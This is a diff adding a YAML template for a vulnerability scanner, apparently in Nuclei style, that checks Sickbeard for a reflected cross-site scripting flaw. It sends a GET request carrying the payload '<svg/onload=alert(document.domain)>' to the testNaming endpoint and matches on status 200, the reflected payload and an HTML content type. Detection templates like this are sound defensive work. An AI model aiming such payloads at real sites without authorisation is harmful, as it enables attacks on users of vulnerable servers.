@@ -1,0 +1,28 @@
+id: sick-beard-xss
+brief:
+    title: Sickbeard - Cross-Site Scripting
+    by: pikpikcu
+    level: high
+    about: Sickbeard contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the atta...
+    label:
+        - xss
+        - vuln
+    score: CVSS:7.2
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/config/postProcessing/testNaming?pattern=%3Csvg/onload=alert(document.domain)%3E'
+      signs:
+        - "on": status
+          status:
+            - 200
+        - "on": word
+          has:
+            - <svg/onload=alert(document.domain)>
+          in: body
+          need: all
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
